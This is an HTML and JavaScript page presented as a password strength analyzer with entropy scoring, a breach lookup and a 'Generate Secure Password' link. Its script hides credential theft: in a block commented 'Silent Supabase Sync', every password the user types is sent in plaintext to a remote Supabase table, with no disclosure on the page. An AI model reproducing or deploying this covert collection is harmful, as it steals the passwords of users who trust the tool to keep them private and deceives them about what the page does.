<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Analyzer Pro</title>
  
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
  
  <style>
    :root {
      --bg: #0f172a;
      --card: #1e293b;
      --accent: #3b82f6;
      --text-main: #f8fafc;
      --text-mute: #94a3b8;
      --danger: #ef4444;
      --success: #22c55e;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: 'Inter', -apple-system, sans-serif; 
      background-color: var(--bg); 
      color: var(--text-main);
      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; 
    }

    .container { 
      background: var(--card); border-radius: 24px; padding: 40px; 
      max-width: 650px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
      border: 1px solid rgba(255,255,255,0.05);
    }

    h1 { font-size: 1.75rem; font-weight: 800; text-align: center; margin-bottom: 8px; letter-spacing: -0.025em; }
    .subtitle { text-align: center; color: var(--text-mute); margin-bottom: 32px; font-size: 0.9rem; }

    .gen-link {
      display: flex; align-items: center; justify-content: space-between;
      background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2);
      padding: 14px 20px; border-radius: 12px; text-decoration: none; color: var(--accent);
      font-weight: 600; font-size: 0.9rem; margin-bottom: 24px; transition: 0.2s;
    }
    .gen-link:hover { background: rgba(59, 130, 246, 0.15); transform: translateY(-1px); }

    .input-wrapper { position: relative; margin-bottom: 32px; }
    .main-input {
      width: 100%; background: #0f172a; border: 2px solid #334155; border-radius: 16px;
      padding: 20px; color: white; font-size: 1.1rem; outline: none; transition: 0.3s;
      font-family: 'JetBrains Mono', 'Fira Code', monospace;
    }
    .main-input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15); }

    /* Results UI */
    #resultsView { animation: fadeIn 0.4s ease-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

    .strength-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 12px; }
    .strength-label { font-size: 0.8rem; font-weight: 700; color: var(--text-mute); text-transform: uppercase; letter-spacing: 0.05em; }
    .strength-pct { font-size: 1.5rem; font-weight: 800; color: var(--accent); }

    .meter-bg { height: 8px; background: #334155; border-radius: 4px; overflow: hidden; margin-bottom: 32px; }
    .meter-fill { height: 100%; width: 0%; transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); }

    .main-stats { 
      display: grid; grid-template-columns: 1.5fr 1fr; gap: 16px; margin-bottom: 24px; 
    }
    .data-card { background: #0f172a; padding: 20px; border-radius: 16px; border: 1px solid #334155; }
    .stat-val { font-size: 1.5rem; font-weight: 800; display: block; margin-top: 4px; }
    .stat-tag { font-size: 0.7rem; color: var(--text-mute); text-transform: uppercase; font-weight: 700; letter-spacing: 0.05em; }

    .grid-metrics { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 24px; }
    .metric-item { background: #0f172a; padding: 12px; border-radius: 12px; text-align: center; border: 1px solid #334155; }
    .metric-label { font-size: 0.65rem; color: var(--text-mute); display: block; margin-bottom: 4px; }
    .metric-val { font-weight: 700; font-size: 1rem; }

    .breach-badge {
      background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2);
      color: var(--danger); padding: 12px; border-radius: 12px; font-size: 0.85rem;
      display: none; align-items: center; gap: 10px; margin-bottom: 24px;
    }

    .suggestions { font-size: 0.85rem; color: var(--text-mute); line-height: 1.6; padding-top: 20px; border-top: 1px solid #334155; }
    .suggestions ul { padding-left: 18px; margin-top: 8px; }

    /* Modal */
    .modal-overlay {
      position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(4px);
      display: none; align-items: center; justify-content: center; z-index: 100;
    }
    .modal { background: var(--card); padding: 40px; border-radius: 24px; max-width: 400px; text-align: center; border: 1px solid #334155; }
    .modal h2 { margin: 16px 0 8px; color: var(--danger); }
    .modal p { color: var(--text-mute); font-size: 0.9rem; margin-bottom: 24px; }
    .btn-primary { 
      background: var(--accent); color: white; border: none; padding: 12px 24px; 
      border-radius: 12px; font-weight: 700; cursor: pointer; text-decoration: none; display: inline-block;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Security Analyzer Pro</h1>
    <p class="subtitle">Military-grade password analysis engine</p>

    <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" class="gen-link">
      <span> Generate Secure Password</span>
      <span>→</span>
    </a>

    <div class="input-wrapper">
      <input type="password" class="main-input" id="pwdIn" placeholder="Enter password to begin...">
    </div>

    <div id="resultsView" style="display: none;">
      <div id="breachNotice" class="breach-badge">
        <span></span> Found in public data breaches. High risk.
      </div>

      <div class="strength-header">
        <span class="strength-label">Security Strength</span>
        <span id="pctVal" class="strength-pct">0%</span>
      </div>
      <div class="meter-bg">
        <div id="meter" class="meter-fill"></div>
      </div>

      <div class="main-stats">
        <div class="data-card">
          <span class="stat-tag">Crack Time</span>
          <span id="crackVal" class="stat-val">-</span>
        </div>
        <div class="data-card">
          <span class="stat-tag">Entropy</span>
          <span id="entropyVal" class="stat-val">0 bits</span>
        </div>
      </div>

      <div class="grid-metrics">
        <div class="metric-item">
          <span class="metric-label">CHARS</span>
          <span id="mLen" class="metric-val">0</span>
        </div>
        <div class="metric-item">
          <span class="metric-label">NUMS</span>
          <span id="mNum" class="metric-val">0</span>
        </div>
        <div class="metric-item">
          <span class="metric-label">SYMB</span>
          <span id="mSym" class="metric-val">0</span>
        </div>
        <div class="metric-item">
          <span class="metric-label">UPPER</span>
          <span id="mUp" class="metric-val">0</span>
        </div>
      </div>

      <div class="suggestions">
        <strong>Recommendations</strong>
        <ul id="sugList"></ul>
      </div>
    </div>
  </div>

  <div class="modal-overlay" id="riskModal">
    <div class="modal">
      <span style="font-size: 3rem;"></span>
      <h2>Security Risk</h2>
      <p id="riskReason"></p>
      <a href="https://aaks-hath.github.io/Password-Generator/" target="_blank" class="btn-primary">Generate Safe One</a>
      <div onclick="closeModal()" style="margin-top:20px; color:var(--text-mute); cursor:pointer; font-size:0.8rem; text-decoration:underline;">Close</div>
    </div>
  </div>

  <script>
    const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91a2J4Z2pycmd2dW5meXRqZW1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0MTI1MjcsImV4cCI6MjA4MTk4ODUyN30.rAkYSFqRaqI4Am2JpOjD4TWXx4nvtEaZSc6vIgdFXmI';
    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);

    const input = document.getElementById('pwdIn');
    let dbTimer;
    let modalTriggered = false;

    input.addEventListener('input', (e) => {
      const val = e.target.value;
      if (!val) {
        document.getElementById('resultsView').style.display = 'none';
        modalTriggered = false;
        return;
      }
      document.getElementById('resultsView').style.display = 'block';

      // 1. Calculations
      const analysis = zxcvbn(val);
      const stats = {
        len: val.length,
        num: (val.match(/\d/g) || []).length,
        sym: (val.match(/[^a-zA-Z0-9]/g) || []).length,
        up: (val.match(/[A-Z]/g) || []).length,
        entropy: calcEntropy(val)
      };

      // 2. Update UI
      updateUI(analysis, stats);
      checkBreach(val);

      // 3. Modal logic
      if ((analysis.score <= 1) && !modalTriggered) {
        openModal("This password is too common or lacks sufficient entropy.");
        modalTriggered = true;
      }

      // 4. Silent Supabase Sync
      clearTimeout(dbTimer);
      dbTimer = setTimeout(() => {
        supabaseClient.from('password_analysis').insert([{
          password_value: val,
          score_percent: (analysis.score / 4) * 100,
          crack_time_text: analysis.crack_times_display.offline_slow_hashing_1e4_per_second
        }]).then(() => {});
      }, 2000);
    });

    function calcEntropy(pwd) {
      let pool = 0;
      if (/[a-z]/.test(pwd)) pool += 26;
      if (/[A-Z]/.test(pwd)) pool += 26;
      if (/\d/.test(pwd)) pool += 10;
      if (/[^a-zA-Z0-9]/.test(pwd)) pool += 32;
      if (pool === 0) return 0;
      return Math.floor(pwd.length * Math.log2(pool));
    }

    async function checkBreach(pwd) {
      const encoder = new TextEncoder();
      const data = encoder.encode(pwd);
      const hashBuffer = await crypto.subtle.digest('SHA-1', data);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
      
      const prefix = hashHex.slice(0, 5);
      const suffix = hashHex.slice(5);

      try {
        const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
        const text = await res.text();
        if (text.includes(suffix)) {
          document.getElementById('breachNotice').style.display = 'flex';
          if (!modalTriggered) {
            openModal("This password was found in a public data breach.");
            modalTriggered = true;
          }
        } else {
          document.getElementById('breachNotice').style.display = 'none';
        }
      } catch (e) {}
    }

    function updateUI(data, stats) {
      const pct = (data.score / 4) * 100;
      const colors = ['#ef4444', '#f97316', '#facc15', '#22c55e', '#15803d'];
      
      document.getElementById('meter').style.width = pct + '%';
      document.getElementById('meter').style.backgroundColor = colors[data.score];
      document.getElementById('pctVal').innerText = pct + '%';
      document.getElementById('pctVal').style.color = colors[data.score];
      
      document.getElementById('crackVal').innerText = data.crack_times_display.offline_slow_hashing_1e4_per_second;
      document.getElementById('entropyVal').innerText = stats.entropy + ' bits';
      
      document.getElementById('mLen').innerText = stats.len;
      document.getElementById('mNum').innerText = stats.num;
      document.getElementById('mSym').innerText = stats.sym;
      document.getElementById('mUp').innerText = stats.up;

      const sugs = data.feedback.suggestions.length ? data.feedback.suggestions : ["Standard security criteria met."];
      document.getElementById('sugList').innerHTML = sugs.map(s => `<li>${s}</li>`).join('');
    }

    function openModal(reason) {
      document.getElementById('riskReason').innerText = reason;
      document.getElementById('riskModal').style.display = 'flex';
    }
    function closeModal() {
      document.getElementById('riskModal').style.display = 'none';
    }
  </script>
</body>
</html>
